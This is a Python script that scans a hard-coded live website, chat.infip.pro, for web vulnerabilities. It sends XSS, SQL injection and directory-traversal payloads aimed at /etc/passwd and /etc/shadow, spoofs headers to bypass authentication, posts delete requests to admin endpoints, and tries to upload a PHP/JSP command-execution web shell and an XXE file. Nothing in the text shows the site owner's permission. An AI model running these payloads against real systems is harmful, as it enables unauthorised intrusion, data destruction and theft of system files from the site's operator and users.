#!/usr/bin/env python3
import urllib.request
import urllib.error
import urllib.parse
import json
import re
import time
import base64

TARGET_URL = "https://chat.infip.pro"

class BugTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session_cookies = {}
        self.found_vulnerabilities = []
        
    def log_vulnerability(self, vuln_type, description, url, payload=None):
        vuln = {
            'type': vuln_type,
            'description': description,
            'url': url,
            'payload': payload,
            'timestamp': time.time()
        }
        self.found_vulnerabilities.append(vuln)
        print(f"🚨 VULNERABILITY FOUND: {vuln_type}")
        print(f"   Description: {description}")
        print(f"   URL: {url}")
        if payload:
            print(f"   Payload: {payload}")
        print()

    def make_request(self, path="", method="GET", data=None, headers=None, follow_redirects=False):
        """Make HTTP request with error handling"""
        url = f"{self.base_url}{path}"
        
        default_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        if headers:
            default_headers.update(headers)
            
        try:
            req = urllib.request.Request(url, data=data, headers=default_headers, method=method)
            
            if follow_redirects:
                response = urllib.request.urlopen(req, timeout=10)
            else:
                response = urllib.request.urlopen(req, timeout=10)
                
            return {
                'status': response.getcode(),
                'headers': dict(response.headers),
                'content': response.read().decode('utf-8', errors='ignore'),
                'url': response.geturl()
            }
            
        except urllib.error.HTTPError as e:
            return {
                'status': e.code,
                'headers': dict(e.headers) if hasattr(e, 'headers') else {},
                'content': e.read().decode('utf-8', errors='ignore') if hasattr(e, 'read') else '',
                'url': url,
                'error': str(e)
            }
        except Exception as e:
            return {
                'status': 0,
                'headers': {},
                'content': '',
                'url': url,
                'error': str(e)
            }

    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        print("🔍 Testing Information Disclosure...")
        
        # Common sensitive files and directories
        sensitive_paths = [
            '/.env',
            '/.git/config',
            '/.git/HEAD',
            '/config.json',
            '/package.json',
            '/composer.json',
            '/web.config',
            '/.htaccess',
            '/robots.txt',
            '/sitemap.xml',
            '/admin',
            '/api',
            '/api/config',
            '/api/users',
            '/api/admin',
            '/debug',
            '/test',
            '/backup',
            '/_next/static/',
            '/static/',
            '/assets/',
            '/uploads/',
            '/files/',
            '/docs/',
            '/documentation/',
            '/swagger/',
            '/graphql',
            '/api/graphql'
        ]
        
        for path in sensitive_paths:
            response = self.make_request(path)
            
            # Check for interesting responses
            if response['status'] == 200:
                content = response['content'].lower()
                if any(keyword in content for keyword in ['password', 'secret', 'key', 'token', 'api_key', 'database', 'config']):
                    self.log_vulnerability(
                        "Information Disclosure", 
                        f"Sensitive information exposed at {path}",
                        response['url']
                    )
            elif response['status'] == 403:
                print(f"⚠️  Directory listing possibly blocked: {path}")
            elif response['status'] not in [404, 307]:
                print(f"🔍 Interesting response {response['status']} for: {path}")

    def test_xss_vulnerabilities(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        print("🔍 Testing XSS Vulnerabilities...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<<SCRIPT>alert('XSS')//<</SCRIPT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>"
        ]
        
        # Test common XSS injection points
        test_endpoints = [
            "/search?q=",
            "/api/search?query=",
            "/?search=",
            "/?q=",
            "/user?name=",
            "/profile?id=",
            "/chat?message=",
            "/access-denied?reason=",
            "/access-denied?details=",
            "/error?message="
        ]
        
        for endpoint in test_endpoints:
            for payload in xss_payloads:
                encoded_payload = urllib.parse.quote(payload)
                response = self.make_request(f"{endpoint}{encoded_payload}")
                
                if response['status'] == 200 and payload in response['content']:
                    self.log_vulnerability(
                        "Reflected XSS",
                        f"XSS payload reflected in response",
                        response['url'],
                        payload
                    )
                    
                # Check for XSS in error messages
                if 'error' in response['content'].lower() and payload in response['content']:
                    self.log_vulnerability(
                        "Error-based XSS",
                        f"XSS payload in error message",
                        response['url'],
                        payload
                    )

    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        print("🔍 Testing SQL Injection...")
        
        sql_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "1; DROP TABLE users--",
            "'; WAITFOR DELAY '00:00:10'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
        ]
        
        # Test endpoints that might interact with database
        test_endpoints = [
            "/api/login",
            "/api/users",
            "/api/search",
            "/login",
            "/search",
            "/user",
            "/profile",
            "/api/chat",
            "/api/messages"
        ]
        
        for endpoint in test_endpoints:
            for payload in sql_payloads:
                # Test GET parameters
                response = self.make_request(f"{endpoint}?id={urllib.parse.quote(payload)}")
                self.check_sql_error_response(response, payload)
                
                # Test POST data
                if endpoint.startswith('/api/'):
                    post_data = json.dumps({"query": payload, "id": payload}).encode('utf-8')
                    headers = {'Content-Type': 'application/json'}
                    response = self.make_request(endpoint, "POST", post_data, headers)
                    self.check_sql_error_response(response, payload)

    def check_sql_error_response(self, response, payload):
        """Check response for SQL error indicators"""
        content = response['content'].lower()
        sql_errors = [
            'sql syntax',
            'mysql_fetch',
            'ora-00933',
            'postgresql',
            'warning: pg_',
            'valid mysql result',
            'mysqlclient',
            'column count doesn\'t match',
            'the used select statements have different number of columns',
            'table doesn\'t exist',
            'sqlite_exception',
            'sqlite3.operationalerror',
            'database error',
            'sql error',
            'syntax error',
            'unclosed quotation mark',
            'quoted string not properly terminated'
        ]
        
        for error in sql_errors:
            if error in content:
                self.log_vulnerability(
                    "SQL Injection",
                    f"SQL error message detected: {error}",
                    response['url'],
                    payload
                )
                break

    def test_directory_traversal(self):
        """Test for directory traversal vulnerabilities"""
        print("🔍 Testing Directory Traversal...")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../etc/shadow",
            "../../../proc/version",
            "../../../etc/issue",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "../../../var/log/apache2/access.log",
            "../../../var/log/nginx/access.log"
        ]
        
        test_endpoints = [
            "/api/file?path=",
            "/download?file=",
            "/view?file=",
            "/static/",
            "/assets/",
            "/uploads/",
            "/files/",
            "/_next/static/"
        ]
        
        for endpoint in test_endpoints:
            for payload in traversal_payloads:
                encoded_payload = urllib.parse.quote(payload)
                response = self.make_request(f"{endpoint}{encoded_payload}")
                
                content = response['content']
                if any(indicator in content for indicator in ['root:', 'bin:', 'daemon:', 'www-data:', '[boot loader]']):
                    self.log_vulnerability(
                        "Directory Traversal",
                        f"System file access detected",
                        response['url'],
                        payload
                    )

    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        print("🔍 Testing Authentication Bypass...")
        
        # Test common admin/protected endpoints
        protected_endpoints = [
            "/admin",
            "/admin/",
            "/admin/dashboard",
            "/admin/users",
            "/admin/config",
            "/api/admin",
            "/api/admin/",
            "/dashboard",
            "/panel",
            "/control",
            "/manage",
            "/administrator"
        ]
        
        bypass_headers = [
            {'X-Original-IP': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'Authorization': 'Bearer admin'},
            {'Authorization': 'Basic YWRtaW46YWRtaW4='},  # admin:admin
            {'X-Admin': 'true'},
            {'X-Role': 'admin'},
            {'X-User-Role': 'administrator'}
        ]
        
        for endpoint in protected_endpoints:
            # Test without bypass headers
            normal_response = self.make_request(endpoint)
            
            # Test with bypass headers
            for headers in bypass_headers:
                bypass_response = self.make_request(endpoint, headers=headers)
                
                # Check if bypass was successful
                if (normal_response['status'] in [401, 403, 404] and 
                    bypass_response['status'] == 200 and 
                    len(bypass_response['content']) > 100):
                    self.log_vulnerability(
                        "Authentication Bypass",
                        f"Access granted with header bypass",
                        bypass_response['url'],
                        str(headers)
                    )

    def test_csrf_vulnerabilities(self):
        """Test for CSRF vulnerabilities"""
        print("🔍 Testing CSRF Vulnerabilities...")
        
        # Look for forms and API endpoints
        response = self.make_request("/")
        
        # Check for CSRF tokens in forms
        csrf_patterns = [
            r'<input[^>]*name=["\']_token["\'][^>]*>',
            r'<input[^>]*name=["\']csrf_token["\'][^>]*>',
            r'<input[^>]*name=["\']authenticity_token["\'][^>]*>',
            r'<meta[^>]*name=["\']csrf-token["\'][^>]*>'
        ]
        
        has_csrf_protection = False
        for pattern in csrf_patterns:
            if re.search(pattern, response['content'], re.IGNORECASE):
                has_csrf_protection = True
                break
        
        if not has_csrf_protection:
            print("⚠️  No CSRF tokens found in main page")
        
        # Test state-changing endpoints without CSRF tokens
        state_changing_endpoints = [
            ("/api/login", {"username": "test", "password": "test"}),
            ("/api/register", {"username": "test", "email": "test@test.com", "password": "test"}),
            ("/api/delete", {"id": "1"}),
            ("/api/update", {"id": "1", "data": "test"}),
            ("/api/admin/users", {"action": "delete", "id": "1"})
        ]
        
        for endpoint, data in state_changing_endpoints:
            post_data = json.dumps(data).encode('utf-8')
            headers = {'Content-Type': 'application/json'}
            response = self.make_request(endpoint, "POST", post_data, headers)
            
            # If request succeeds without CSRF token, it's vulnerable
            if response['status'] == 200 and 'error' not in response['content'].lower():
                self.log_vulnerability(
                    "CSRF",
                    f"State-changing request accepted without CSRF token",
                    response['url'],
                    str(data)
                )

    def test_security_headers(self):
        """Test for missing security headers"""
        print("🔍 Testing Security Headers...")
        
        response = self.make_request("/")
        headers = response['headers']
        
        security_headers = {
            'X-Frame-Options': 'Missing clickjacking protection',
            'X-Content-Type-Options': 'Missing MIME type sniffing protection',
            'X-XSS-Protection': 'Missing XSS protection header',
            'Strict-Transport-Security': 'Missing HSTS header',
            'Content-Security-Policy': 'Missing CSP header',
            'Referrer-Policy': 'Missing referrer policy',
            'Permissions-Policy': 'Missing permissions policy'
        }
        
        for header, description in security_headers.items():
            if header.lower() not in [h.lower() for h in headers.keys()]:
                print(f"⚠️  {description}: {header}")
            else:
                print(f"✅ {header}: {headers.get(header, '')}")

    def test_file_upload_vulnerabilities(self):
        """Test for file upload vulnerabilities"""
        print("🔍 Testing File Upload Vulnerabilities...")
        
        upload_endpoints = [
            "/upload",
            "/api/upload",
            "/file/upload",
            "/admin/upload",
            "/api/file/upload",
            "/api/files",
            "/media/upload"
        ]
        
        # Test different file types
        malicious_files = [
            ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("test.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
            ("script.js", "alert('XSS')", "application/javascript"),
            ("test.html", "<script>alert('XSS')</script>", "text/html"),
            ("config.xml", "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>", "application/xml")
        ]
        
        for endpoint in upload_endpoints:
            for filename, content, content_type in malicious_files:
                # Create multipart form data
                boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
                body = f'--{boundary}\r\n'
                body += f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
                body += f'Content-Type: {content_type}\r\n\r\n'
                body += content + '\r\n'
                body += f'--{boundary}--\r\n'
                
                headers = {
                    'Content-Type': f'multipart/form-data; boundary={boundary}',
                    'Content-Length': str(len(body))
                }
                
                response = self.make_request(endpoint, "POST", body.encode(), headers)
                
                if response['status'] == 200 and 'success' in response['content'].lower():
                    self.log_vulnerability(
                        "File Upload",
                        f"Malicious file upload accepted: {filename}",
                        response['url'],
                        filename
                    )

    def test_session_management(self):
        """Test session management vulnerabilities"""
        print("🔍 Testing Session Management...")
        
        # Test session fixation
        response1 = self.make_request("/")
        cookies1 = response1['headers'].get('Set-Cookie', '')
        
        # Try to login (if login endpoint exists)
        login_data = json.dumps({"username": "test", "password": "test"}).encode('utf-8')
        headers = {'Content-Type': 'application/json'}
        response2 = self.make_request("/api/login", "POST", login_data, headers)
        cookies2 = response2['headers'].get('Set-Cookie', '')
        
        if cookies1 and cookies2 and cookies1 == cookies2:
            print("⚠️  Potential session fixation vulnerability")
        
        # Check session cookie security
        if cookies2:
            if 'secure' not in cookies2.lower():
                print("⚠️  Session cookie missing Secure flag")
            if 'httponly' not in cookies2.lower():
                print("⚠️  Session cookie missing HttpOnly flag")
            if 'samesite' not in cookies2.lower():
                print("⚠️  Session cookie missing SameSite attribute")

    def run_all_tests(self):
        """Run all vulnerability tests"""
        print(f"🚀 Starting comprehensive security testing on {self.base_url}")
        print("=" * 60)
        
        try:
            self.test_information_disclosure()
            self.test_security_headers()
            self.test_xss_vulnerabilities()
            self.test_sql_injection()
            self.test_directory_traversal()
            self.test_authentication_bypass()
            self.test_csrf_vulnerabilities()
            self.test_file_upload_vulnerabilities()
            self.test_session_management()
        except KeyboardInterrupt:
            print("\n⚠️  Testing interrupted by user")
        except Exception as e:
            print(f"❌ Error during testing: {e}")
        
        print("=" * 60)
        print("🎯 VULNERABILITY SUMMARY")
        print("=" * 60)
        
        if self.found_vulnerabilities:
            print(f"🚨 Found {len(self.found_vulnerabilities)} vulnerabilities:")
            for i, vuln in enumerate(self.found_vulnerabilities, 1):
                print(f"{i}. {vuln['type']}: {vuln['description']}")
                print(f"   URL: {vuln['url']}")
                if vuln['payload']:
                    print(f"   Payload: {vuln['payload']}")
                print()
        else:
            print("✅ No critical vulnerabilities found in automated tests")
            print("   Note: Manual testing may reveal additional issues")
        
        print("⚠️  IMPORTANT: This is an automated scan. Manual testing")
        print("   and code review are recommended for comprehensive security assessment.")

if __name__ == "__main__":
    tester = BugTester(TARGET_URL)
    tester.run_all_tests()